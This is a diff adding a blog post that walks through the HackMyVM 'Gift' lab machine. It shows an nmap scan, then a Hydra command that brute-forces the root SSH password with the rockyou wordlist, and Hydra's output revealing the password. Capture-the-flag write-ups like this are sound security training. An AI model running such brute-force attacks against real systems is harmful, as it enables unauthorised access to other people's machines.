@@ -1,0 +1,55 @@
+---
+layout: post
+title: "HackMyVM: Gift"
+---
+
+An incredibly easy VM that's also easy to overthink.
+
+### Recon
+
+**nmap**
+
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-23 01:05 EST  
+Nmap scan report for 192.168.56.110  
+Host is up (0.00028s latency).  
+Not shown: 998 closed ports  
+PORT   STATE SERVICE VERSION  
+22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)  
+80/tcp open  http    nginx  
+|_http-title: Site doesn't have a title (text/html).  
+  
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
+```
+
+A 22-80. We know where to go first.
+
+**website**
+
+The site is just a simple HTML file, with only the contents `Dont Overthink. Really, Its simple.` in it, along with an HTML comment: `Trust me`. Clearly, there isn't much here. Since this is the case, we might as well try to go for SSH.
+
+### User & Root
+
+The only user we know to exist on this box for certain is `root`. We (once again) use Hydra to brute force possible passwords for the root user:
+```
+hydra -l root -P ~/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://192.168.56.110
+```
+
+Mind the IP, hope it doesn't impede. After only a minute, we get a password for root:
+```
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these ***  
+ignore laws and ethics anyway).  
+  
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-23 01:10:31  
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task  
+[DATA] attacking ssh://192.168.56.110:22/  
+[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344222 to do in 1358:22h, 16 active  
+[22][ssh] host: 192.168.56.110   login: root   password: simple
+```
+
+These credentials give us full root access to the machine. That was faster than any of us thought.
+```
+gift:~#
+```
